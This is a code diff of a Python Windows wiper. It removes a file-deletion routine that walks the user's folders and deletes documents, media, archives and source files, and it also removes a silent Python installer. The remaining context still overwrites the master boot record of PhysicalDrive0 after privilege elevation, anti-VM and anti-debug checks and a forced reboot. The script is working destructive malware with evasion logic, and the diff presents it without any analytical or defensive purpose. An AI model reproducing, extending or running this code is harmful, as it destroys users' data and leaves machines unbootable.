@@ -58,24 +58,6 @@ def IsOnline():
     except:
         return False
 
-def IsPythonInstalled():
-    """if Python is already installed."""
-    return bool(os.path.exists("C:\\Python39"))
-
-def InstallPython():
-    """Download and install Python"""
-    if not IsPythonInstalled():
-        architecture = "amd64" if platform.machine().endswith('64') else "x86"
-        python_version = "3.8.1"
-        url = f"https://www.python.org/ftp/python/{python_version}/python-{python_version}-{architecture}.exe"
-        random_generator = random.randrange(111, 9999999)
-        temp_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\{random_generator}.exe"
-        subprocess.run(["powershell", "-Command", f"Start-BitsTransfer -Source {url} -Destination {temp_path}"])
-        time.sleep(10) 
-        if os.path.exists(temp_path):
-            subprocess.run([temp_path, "/quiet", "InstallAllUsers=0", "Include_launcher=0", "PrependPath=1", "Include_test=0"])
-            os.remove(temp_path)
-
 def IsVirtualized():
     """Check if the system is running in a virtualized environment."""
     result = False
@@ -134,35 +116,12 @@ buffer = bytes([
     # depending on specific requirements
     0x00] * 446 + [0x00, 0x00, 0x55, 0xAA]) # MBR signature
 
-    """ return bytes([random.randint(0, 255) for _ in range(bytes_to_write)]) """
+""" return bytes([random.randint(0, 255) for _ in range(bytes_to_write)]) """
     
 def OverWriteMBR(): 
     hDevice = CreateFileW(r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0)
     bytes_written = WriteFile(hDevice, buffer, None)
     CloseHandle(hDevice) # Close the handle to our Physical Drive!
-
-def DeleteFiles(file_path):
-    kernel32 = ctypes.WinDLL('kernel32')
-    if kernel32.DeleteFileW(file_path):
-        return True
-    else:
-        return False
-
-def SetFiles():
-    ext = [".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
-           ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
-           ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", 
-           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h", 
-           ".gif", ".txt", ".jar", ".sql", ".bundle",
-           ".sqlite3", ".html", ".php", ".log", ".bak", ".deb"]
-    for dirpath, _, files in os.walk(f"C:\\Users\\{os.getlogin()}\\{os.getcwd()}"): 
-        for f in files:
-            if f.endswith(tuple(ext)): 
-                file_path = os.path.join(dirpath, f)
-                if DeleteFiles(file_path):
-                    print(f"Successfully deleted: {file_path}")
-                else:
-                    print(f"Failed to delete: {file_path}")
 
 def AntiDebug():
     result = False
@@ -215,16 +174,10 @@ def main():
     else:
         application_path = os.path.dirname(os.path.abspath(__file__))
     
-    if not IsPythonInstalled():
-        InstallPython()
-        subprocess.run(["python", "-m", "pip", "install", "--upgrade", "pip"])
-        subprocess.run(["python", "-m", "pip", "install", "pyinstaller"])
-    
     RunAsAdmin()
     if not IsOnline():
         CommitSuicide()
     AntiVM()
-    SetFiles()
     SysDown(timeout_seconds=2, force=True, reboot=True)
     OverWriteMBR()
 
